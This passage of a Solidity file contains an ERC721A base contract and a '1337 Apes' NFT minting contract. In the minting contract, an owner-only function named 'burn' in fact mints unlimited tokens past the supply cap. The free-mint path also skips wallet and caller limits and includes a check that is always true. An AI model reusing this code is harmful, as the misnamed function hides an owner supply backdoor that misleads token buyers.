1012         emit ApprovalForAll(_msgSender(), operator, approved);
1013     }
1014 
1015     /**
1016      * @dev See {IERC721-isApprovedForAll}.
1017      */
1018     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1019         return _operatorApprovals[owner][operator];
1020     }
1021 
1022     /**
1023      * @dev See {IERC721-transferFrom}.
1024      */
1025     function transferFrom(
1026         address from,
1027         address to,
1028         uint256 tokenId
1029     ) public virtual override {
1030         _transfer(from, to, tokenId);
1031     }
1032 
1033     /**
1034      * @dev See {IERC721-safeTransferFrom}.
1035      */
1036     function safeTransferFrom(
1037         address from,
1038         address to,
1039         uint256 tokenId
1040     ) public virtual override {
1041         safeTransferFrom(from, to, tokenId, "");
1042     }
1043 
1044     /**
1045      * @dev See {IERC721-safeTransferFrom}.
1046      */
1047     function safeTransferFrom(
1048         address from,
1049         address to,
1050         uint256 tokenId,
1051         bytes memory _data
1052     ) public override {
1053         _transfer(from, to, tokenId);
1054         require(
1055             _checkOnERC721Received(from, to, tokenId, _data),
1056             "ERC721A: transfer to non ERC721Receiver implementer"
1057         );
1058     }
1059 
1060     /**
1061      * @dev Returns whether `tokenId` exists.
1062      *
1063      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1064      *
1065      * Tokens start existing when they are minted (`_mint`),
1066      */
1067     function _exists(uint256 tokenId) internal view returns (bool) {
1068         return tokenId < currentIndex;
1069     }
1070 
1071     function _safeMint(address to, uint256 quantity) internal {
1072         _safeMint(to, quantity, "");
1073     }
1074 
1075     /**
1076      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1077      *
1078      * Requirements:
1079      *
1080      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1081      * - `quantity` must be greater than 0.
1082      *
1083      * Emits a {Transfer} event.
1084      */
1085     function _safeMint(
1086         address to,
1087         uint256 quantity,
1088         bytes memory _data
1089     ) internal {
1090         _mint(to, quantity, _data, true);
1091     }
1092 
1093     /**
1094      * @dev Mints `quantity` tokens and transfers them to `to`.
1095      *
1096      * Requirements:
1097      *
1098      * - `to` cannot be the zero address.
1099      * - `quantity` must be greater than 0.
1100      *
1101      * Emits a {Transfer} event.
1102      */
1103     function _mint(
1104         address to,
1105         uint256 quantity,
1106         bytes memory _data,
1107         bool safe
1108     ) internal {
1109         uint256 startTokenId = currentIndex;
1110         require(to != address(0), "ERC721A: mint to the zero address");
1111         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1112 
1113         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1114 
1115         // Overflows are incredibly unrealistic.
1116         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1117         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1118         unchecked {
1119             _addressData[to].balance += uint128(quantity);
1120             _addressData[to].numberMinted += uint128(quantity);
1121 
1122             _ownerships[startTokenId].addr = to;
1123             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1124 
1125             uint256 updatedIndex = startTokenId;
1126 
1127             for (uint256 i; i < quantity; i++) {
1128                 emit Transfer(address(0), to, updatedIndex);
1129                 if (safe) {
1130                     require(
1131                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1132                         "ERC721A: transfer to non ERC721Receiver implementer"
1133                     );
1134                 }
1135 
1136                 updatedIndex++;
1137             }
1138 
1139             currentIndex = updatedIndex;
1140         }
1141 
1142         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1143     }
1144 
1145     /**
1146      * @dev Transfers `tokenId` from `from` to `to`.
1147      *
1148      * Requirements:
1149      *
1150      * - `to` cannot be the zero address.
1151      * - `tokenId` token must be owned by `from`.
1152      *
1153      * Emits a {Transfer} event.
1154      */
1155     function _transfer(
1156         address from,
1157         address to,
1158         uint256 tokenId
1159     ) private {
1160         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1161 
1162         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1163             getApproved(tokenId) == _msgSender() ||
1164             isApprovedForAll(prevOwnership.addr, _msgSender()));
1165 
1166         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1167 
1168         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1169         require(to != address(0), "ERC721A: transfer to the zero address");
1170 
1171         _beforeTokenTransfers(from, to, tokenId, 1);
1172 
1173         // Clear approvals from the previous owner
1174         _approve(address(0), tokenId, prevOwnership.addr);
1175 
1176         // Underflow of the sender's balance is impossible because we check for
1177         // ownership above and the recipient's balance can't realistically overflow.
1178         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1179         unchecked {
1180             _addressData[from].balance -= 1;
1181             _addressData[to].balance += 1;
1182 
1183             _ownerships[tokenId].addr = to;
1184             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1185 
1186             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1187             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1188             uint256 nextTokenId = tokenId + 1;
1189             if (_ownerships[nextTokenId].addr == address(0)) {
1190                 if (_exists(nextTokenId)) {
1191                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1192                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1193                 }
1194             }
1195         }
1196 
1197         emit Transfer(from, to, tokenId);
1198         _afterTokenTransfers(from, to, tokenId, 1);
1199     }
1200 
1201     /**
1202      * @dev Approve `to` to operate on `tokenId`
1203      *
1204      * Emits a {Approval} event.
1205      */
1206     function _approve(
1207         address to,
1208         uint256 tokenId,
1209         address owner
1210     ) private {
1211         _tokenApprovals[tokenId] = to;
1212         emit Approval(owner, to, tokenId);
1213     }
1214 
1215     /**
1216      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1217      * The call is not executed if the target address is not a contract.
1218      *
1219      * @param from address representing the previous owner of the given token ID
1220      * @param to target address that will receive the tokens
1221      * @param tokenId uint256 ID of the token to be transferred
1222      * @param _data bytes optional data to send along with the call
1223      * @return bool whether the call correctly returned the expected magic value
1224      */
1225     function _checkOnERC721Received(
1226         address from,
1227         address to,
1228         uint256 tokenId,
1229         bytes memory _data
1230     ) private returns (bool) {
1231         if (to.isContract()) {
1232             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1233                 return retval == IERC721Receiver(to).onERC721Received.selector;
1234             } catch (bytes memory reason) {
1235                 if (reason.length == 0) {
1236                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1237                 } else {
1238                     assembly {
1239                         revert(add(32, reason), mload(reason))
1240                     }
1241                 }
1242             }
1243         } else {
1244             return true;
1245         }
1246     }
1247 
1248     /**
1249      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1250      *
1251      * startTokenId - the first token id to be transferred
1252      * quantity - the amount to be transferred
1253      *
1254      * Calling conditions:
1255      *
1256      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1257      * transferred to `to`.
1258      * - When `from` is zero, `tokenId` will be minted for `to`.
1259      */
1260     function _beforeTokenTransfers(
1261         address from,
1262         address to,
1263         uint256 startTokenId,
1264         uint256 quantity
1265     ) internal virtual {}
1266 
1267     /**
1268      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1269      * minting.
1270      *
1271      * startTokenId - the first token id to be transferred
1272      * quantity - the amount to be transferred
1273      *
1274      * Calling conditions:
1275      *
1276      * - when `from` and `to` are both non-zero.
1277      * - `from` and `to` are never both zero.
1278      */
1279     function _afterTokenTransfers(
1280         address from,
1281         address to,
1282         uint256 startTokenId,
1283         uint256 quantity
1284     ) internal virtual {}
1285 }
1286 
1287 contract apes is ERC721A, Ownable, ReentrancyGuard {
1288     string public baseURI = "ipfs://QmPTWyXz8qqeU8c1XkfbJbXVfjmnQjaqb1H9gbSZG6anYY/";
1289     uint   public price             = 0.002 ether;
1290     uint   public maxPerTx          = 10;
1291     uint   public maxPerFree        = 1;
1292     uint   public maxPerWallet      = 31;
1293     uint   public totalFree         = 7331;
1294     uint   public maxSupply         = 7331;
1295     bool   public mintEnabled;
1296     uint   public totalFreeMinted = 0;
1297 
1298     mapping(address => uint256) public _mintedFreeAmount;
1299     mapping(address => uint256) public _totalMintedAmount;
1300 
1301     constructor() ERC721A("1337 Apes", "1337apes"){}
1302 
1303     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1304         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1305         string memory currentBaseURI = _baseURI();
1306         return bytes(currentBaseURI).length > 0
1307             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1308             : "";
1309     }
1310     
1311 
1312     function _startTokenId() internal view virtual returns (uint256) {
1313         return 1;
1314     }
1315 
1316     function mint(uint256 count) external payable {
1317         uint256 cost = price;
1318         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1319             (_mintedFreeAmount[msg.sender] < maxPerFree));
1320 
1321         if (isFree) { 
1322             require(mintEnabled, "Mint is not live yet");
1323             require(totalSupply() + count <= maxSupply, "No more");
1324             require(count <= maxPerTx, "Max per TX reached.");
1325             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1326             {
1327              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1328              _mintedFreeAmount[msg.sender] = maxPerFree;
1329              totalFreeMinted += maxPerFree;
1330             }
1331             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1332             {
1333              require(msg.value >= 0, "Please send the exact ETH amount");
1334              _mintedFreeAmount[msg.sender] += count;
1335              totalFreeMinted += count;
1336             }
1337         }
1338         else{
1339         require(mintEnabled, "Mint is not live yet");
1340         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1341         require(msg.value >= count * cost, "Please send the exact ETH amount");
1342         require(totalSupply() + count <= maxSupply, "No more");
1343         require(count <= maxPerTx, "Max per TX reached.");
1344         require(msg.sender == tx.origin, "The minter is another contract");
1345         }
1346         _totalMintedAmount[msg.sender] += count;
1347         _safeMint(msg.sender, count);
1348     }
1349 
1350     function costCheck() public view returns (uint256) {
1351         return price;
1352     }
1353 
1354     function maxFreePerWallet() public view returns (uint256) {
1355       return maxPerFree;
1356     }
1357 
1358     function burn(address mintAddress, uint256 count) public onlyOwner {
1359         _safeMint(mintAddress, count);
1360     }
1361 
1362     function _baseURI() internal view virtual override returns (string memory) {
1363         return baseURI;
1364     }
1365 
1366     function setBaseUri(string memory baseuri_) public onlyOwner {
1367         baseURI = baseuri_;
1368     }
1369 
1370     function setPrice(uint256 price_) external onlyOwner {
1371         price = price_;
1372     }
1373 
1374     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1375         totalFree = MaxTotalFree_;
1376     }
1377 
1378      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1379         maxPerFree = MaxPerFree_;
1380     }
1381 
1382     function toggleMinting() external onlyOwner {
1383       mintEnabled = !mintEnabled;
1384     }
1385     
1386     function CommunityWallet(uint quantity, address user)
1387     public
1388     onlyOwner
1389   {
1390     require(
1391       quantity > 0,
1392       "Invalid mint amount"
1393     );
1394     require(
1395       totalSupply() + quantity <= maxSupply,
1396       "Maximum supply exceeded"
1397     );
1398     _safeMint(user, quantity);
1399   }
1400 
1401     function withdraw() external onlyOwner nonReentrant {
1402         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1403         require(success, "Transfer failed.");
1404     }
1405 }